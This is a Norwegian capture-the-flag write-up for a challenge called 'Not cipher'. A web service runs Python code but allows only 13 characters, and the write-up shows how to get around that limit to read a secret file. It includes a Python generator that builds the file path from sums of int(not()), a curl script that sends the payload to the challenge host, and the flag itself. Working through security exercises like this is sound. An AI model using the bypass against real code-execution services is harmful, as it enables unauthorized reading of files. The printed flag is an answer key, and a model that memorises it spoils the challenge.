### Not cipher
Utvikler Carl I. Pher trenger av og til å kjøre python-programmer på webserveren sin. Derfor har han laget en veldig enkel webtjeneste for å sende inn python-programmer og returnere output:

Eksempelkjøring av program: curl 'http://server/?program=print(repr(repr))'

For å hindre misbruk er kun 13 forskjellige tegn tillatt i python-programmet: not+cipher(*)

Dessverre viser det seg at dette ikke er godt nok. Hent ut flagget i /lol/hemmeligmappe/flagg.txt

#### Løsning
Her har man kun 13 tegn man kan bruke, og fil-banen vi skal til har mange bokstaver som vi ikke har tilgjengelig. Heldigvis har vi nok bokstaver til `chr`, noe som betyr at vi kan gjøre tall om til bokstaver. Men da er problemet, hvordan skal man få tall? Her kan vi bruke et par forskjellige måter:

1. `int()**int()`. Dette blir 0^0=1
2. `int(not())` 

Jeg valgte å bruke int(not()) for å redusere lengden.

Måten jeg løste det på var å lage et python script til å generere en lang rekke med `chr(int(not())+int(not()))+...`.

```python
path = "/lol/hemmeligmappe/flagg.txt"
one = "int(not())+"

script_content = "print(*open("

for char in path:
    ascii_value = ord(char)
    char_expression = one * ascii_value
    script_content += "chr(" + char_expression[:-1] + ")+"

script_content = script_content.rstrip('+') + "))"

with open("solve.py", "w") as file:
    file.write(script_content)
```
Her får jeg ascii tallet for hver bokstav i filbanen og ganger dette med stringen `"int(not())+"` sånn at vi lager det samme tallet. Til slutt legger vi til `print(*open(` i starten og `))` på slutten og skriver det til en ny fil. Innholdet av denne filen er det vi sender til serveren.

Problemet her er at filen er for stor til å bli limt inn i terminalen, så vi må også lage et bash script for å sende det.
```sh
#!/bin/bash

script_path="solve.py"
url_encoded_script=$(<"$script_path" python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))")
url="https://helsectf2024-2da207d37b091b1b4dff-not-cipher.chals.io/?program=$url_encoded_script"
curl "$url"
```


`helsectf{lange_programmer_lever_lengst}`
